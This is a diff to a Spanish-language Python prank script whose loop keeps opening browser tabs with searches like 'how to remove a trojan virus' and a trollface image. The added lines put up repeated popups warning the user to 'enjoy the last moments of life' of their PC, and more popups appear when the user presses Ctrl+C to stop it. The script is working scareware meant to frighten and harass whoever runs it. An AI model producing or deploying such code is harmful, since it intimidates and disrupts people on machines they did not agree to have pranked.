@@ -21,6 +21,7 @@ Descripción del error: {e}
 def webOpen():
      try:
           while True:
+               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
                tup_searches = (
                     'https://www.google.com/search?q=como+eliminar+virus+troyano+linux+atacante',
                     'https://www.google.com/search?q=ayuda+mi+computador+hace+cosas+raras',
@@ -31,13 +32,19 @@ def webOpen():
                     'https://www.google.com/search?q=descargar+minecraft+premium+gratis+linux+tentador+2020',
                     'http://4.bp.blogspot.com/-w6UkeTKqd3E/UpdEMzDKJFI/AAAAAAAAFEE/rh0BkH-AklU/s1600/3d-trollface-nodding-ok-yes-agree-troll-face.gif'
                )
-
+               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
                open(choice(tup_searches))
-               
+               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
+               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
+               messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
                sleep(10)               
                
      except KeyboardInterrupt:
           print("XD")
+          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
+          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
+          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
+          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
           
      except Exception as e:
           handle(e)
